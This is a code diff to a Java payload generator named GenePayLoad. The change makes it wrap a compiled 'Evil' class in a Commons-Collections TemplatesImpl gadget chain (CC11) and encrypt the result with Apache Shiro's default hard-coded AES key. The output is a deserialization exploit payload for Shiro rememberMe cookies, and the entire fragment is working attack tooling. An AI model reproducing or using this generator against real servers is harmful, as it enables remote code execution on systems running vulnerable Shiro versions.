@@ -373,7 +373,7 @@ public class GenePayLoad {
         field.setAccessible(true);
         field.set(obj, newValue);
     }
-    public static byte[] CC6_PayLoad(byte[] clazzBytes) throws Exception {
+    public static byte[] CC11_PayLoad(byte[] clazzBytes) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
         setFieldValue(obj, "_name", "HelloTemplatesImpl");
@@ -403,11 +403,11 @@ public class GenePayLoad {
     }
 
     public static void main(String[] args) throws Exception {
-        byte[] payloads = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
+        byte[] codes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
         AesCipherService aes = new AesCipherService();
         byte[] key =
                 java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
-        ByteSource ciphertext = aes.encrypt(payloads, key);
+        ByteSource ciphertext = aes.encrypt(CC11_PayLoad(codes), key);
         System.out.printf(ciphertext.toString());
     }
 }
